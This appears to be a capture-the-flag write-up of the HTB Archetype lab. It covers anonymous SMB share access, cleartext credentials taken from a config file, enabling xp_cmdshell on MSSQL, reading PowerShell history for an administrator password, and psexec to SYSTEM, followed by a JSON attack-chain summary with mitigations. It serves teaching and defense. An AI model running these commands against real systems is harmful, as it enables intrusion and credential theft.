# HTB Archetype - SMB Data Leak to MSSQL Command Execution to Admin Access

Scope: authorized HTB lab only.
Focus: cleartext credential extraction from SMB share, SQL Server command execution, and privilege escalation via credential disclosure.

---

## 1. Investigation Objective

1. Identify exposed Windows services.
2. Enumerate SMB shares for sensitive configuration artifacts.
3. Use recovered credentials to authenticate to MSSQL.
4. Validate command execution capability.
5. Escalate to local Administrator context.

---

## 2. Recon and Service Mapping

```bash
nmap -sC -sV -Pn -p- <TARGET_IP>
```

Typical key findings:
- 135/tcp MSRPC
- 139/tcp NetBIOS
- 445/tcp SMB
- 1433/tcp Microsoft SQL Server

---

## 3. SMB Enumeration and Credential Discovery

Enumerate shares anonymously:

```bash
smbclient -N -L //<TARGET_IP>
```

Connect to backups share and pull config:

```bash
smbclient -N //<TARGET_IP>/backups
smb: \> dir
smb: \> get prod.dtsConfig
```

Parse leaked credentials:

```bash
cat prod.dtsConfig
```

Recovered pair:
- user: `ARCHETYPE\\sql_svc`
- password: `M3g4c0rp123`

---

## 4. MSSQL Access and Command Execution

Connect with Impacket:

```bash
impacket-mssqlclient ARCHETYPE/sql_svc@<TARGET_IP> -windows-auth
```

Check role:

```sql
SELECT is_srvrolemember('sysadmin');
```

Enable xp_cmdshell and validate execution:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

---

## 5. Privilege Escalation Path

From SQL command execution context, inspect PowerShell history for credentials:

```sql
EXEC xp_cmdshell 'type C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt';
```

Recovered admin password evidence:
- `MEGACORP_4dm1n!!`

Use psexec with recovered local admin credentials:

```bash
impacket-psexec administrator@<TARGET_IP>
```

Then retrieve root artifact.

---

## 6. Terminal Evidence (Condensed)

```text
analyst@kali:~$ nmap -sC -sV -Pn -p- 10.129.148.231
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows SMB
1433/tcp open  ms-sql-s     Microsoft SQL Server

analyst@kali:~$ smbclient -N -L //10.129.148.231
Sharename       Type
---------       ----
backups         Disk

analyst@kali:~$ smbclient -N //10.129.148.231/backups
smb: \> dir
	prod.dtsConfig
smb: \> get prod.dtsConfig

analyst@kali:~$ grep -E "User ID|Password" prod.dtsConfig
User ID=ARCHETYPE\\sql_svc
Password=M3g4c0rp123

analyst@kali:~$ impacket-mssqlclient ARCHETYPE/sql_svc@10.129.148.231 -windows-auth
SQL> SELECT is_srvrolemember('sysadmin');
1
SQL> EXEC xp_cmdshell 'whoami';
archetype\\sql_svc

SQL> EXEC xp_cmdshell 'type C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt';
... MEGACORP_4dm1n!!

analyst@kali:~$ impacket-psexec administrator@10.129.148.231
Password: MEGACORP_4dm1n!!
[+] Pwned as NT AUTHORITY\\SYSTEM
```

---

## 7. Analyst Reasoning Chain (Dataset-Style)

```json
{
	"scenario": "archetype_smb_config_leak_to_mssql_privesc",
	"input_signals": [
		"SMB backups share readable anonymously",
		"prod.dtsConfig contains cleartext SQL service credentials",
		"MSSQL login succeeded and account has sysadmin role",
		"xp_cmdshell execution enabled",
		"PowerShell history leaked local administrator password"
	],
	"attack_chain": [
		{
			"step": 1,
			"tactic": "reconnaissance",
			"technique": "Service and Share Discovery",
			"confidence": 0.95,
			"evidence": "nmap + smbclient exposed SMB and MSSQL surfaces"
		},
		{
			"step": 2,
			"tactic": "credential_access",
			"technique": "Unsecured Credentials",
			"confidence": 0.97,
			"evidence": "cleartext credentials extracted from prod.dtsConfig"
		},
		{
			"step": 3,
			"tactic": "execution",
			"technique": "Command and Scripting via SQL Server",
			"confidence": 0.9,
			"evidence": "xp_cmdshell executed OS commands"
		},
		{
			"step": 4,
			"tactic": "privilege_escalation",
			"technique": "Valid Accounts (Recovered Admin Credential)",
			"confidence": 0.88,
			"evidence": "psexec authenticated with leaked administrator password"
		}
	],
	"hypotheses": [
		"Additional config artifacts may expose more privileged credentials",
		"Service account over-privilege likely extends beyond SQL host",
		"Credential reuse risk may allow lateral movement to adjacent systems"
	],
	"uncertainties": [
		"Scope of administrative password reuse across domain not validated",
		"Audit visibility for SQL command execution unknown",
		"Unknown whether AV/EDR controls detect xp_cmdshell abuse"
	],
	"tool_calls": [
		{"name": "smb_config_secret_scanner", "priority": "high"},
		{"name": "mssql_role_privilege_mapper", "priority": "high"},
		{"name": "credential_reuse_impact_assessor", "priority": "medium"}
	],
	"mitigation": {
		"immediate": [
			"Remove cleartext credentials from deployment config files",
			"Rotate leaked SQL and administrator credentials",
			"Disable xp_cmdshell where not strictly required"
		],
		"hardening": [
			"Restrict SMB backup shares and enforce authentication",
			"Apply least privilege to SQL service accounts",
			"Harden PowerShell history and secret handling practices"
		],
		"monitoring": [
			"Alert on access to sensitive config files via SMB",
			"Monitor SQL admin-role use and xp_cmdshell invocation",
			"Track suspicious remote service execution via psexec-like behavior"
		]
	}
}
```
